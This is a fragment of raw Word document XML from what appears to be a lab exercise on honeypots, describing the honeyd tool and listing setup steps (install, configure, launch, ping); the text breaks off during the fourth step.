        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="7"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="6"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>powerfu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="6"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ow-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>ac</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="6"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Open</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="6"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Source</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="6"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>honeypo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="6"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>can</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="6"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>be</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="6"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>run</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="6"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>bo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">h </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>U</w:t>
      </w:r>
      <w:r>
        <w:t>NIX-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>li</w:t>
      </w:r>
      <w:r>
        <w:t>ke</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-11"/>
        </w:rPr>
        <w:t>W</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ndows</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>for</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>s.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="4"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>It</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>can</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="4"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>or</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="4"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>unused</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>IPs,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>im</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>oper</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="4"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">he </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>CP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>IP s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ack</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="10"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ev</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="10"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>im</w:t>
      </w:r>
      <w:r>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="9"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>housands</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="8"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>of</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="10"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ual</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="9"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>hos</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="8"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="9"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="9"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>sa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="9"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>tim</w:t>
      </w:r>
      <w:r>
        <w:t>e,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="10"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="10"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>or</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="10"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="9"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>UDP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>CP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-10"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>based</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>por</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>s.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="9" w:line="100" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="10"/>
          <w:szCs w:val="10"/>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right="8873"/>
        <w:jc w:val="both"/>
        <w:sectPr w:rsidR="00090D7C">
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1060" w:right="102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4116" w:right="1335" w:hanging="4016"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Ex. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>N</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">o.: 13b                                                                                                         </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="41"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">ate: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>HO</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>NEY</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>PO</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>TS</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06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60" w:bottom="280" w:left="1140" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:num="2" w:space="720" w:equalWidth="0">
            <w:col w:w="620" w:space="190"/>
            <w:col w:w="8890"/>
          </w:cols>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-17"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>o se</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>up and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>or</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>honeypo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>s us</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve">ng honeyd </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>oo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>.</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1.  I</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">honeyd on one of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>ys</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>2.  Cr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>honeyd conf</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>gur</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>il</w:t>
      </w:r>
      <w:r>
        <w:t>e.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">3.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>L</w:t>
      </w:r>
      <w:r>
        <w:t>aunch</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>honeyd w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>h op</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>ons</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>-i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>-d and -f af</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>conf</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>gur</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>on f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>es are</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>crea</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ed.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>4.  P</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng from</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-11"/>
        </w:rPr>
        <w:t>W</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ndows</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>L</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
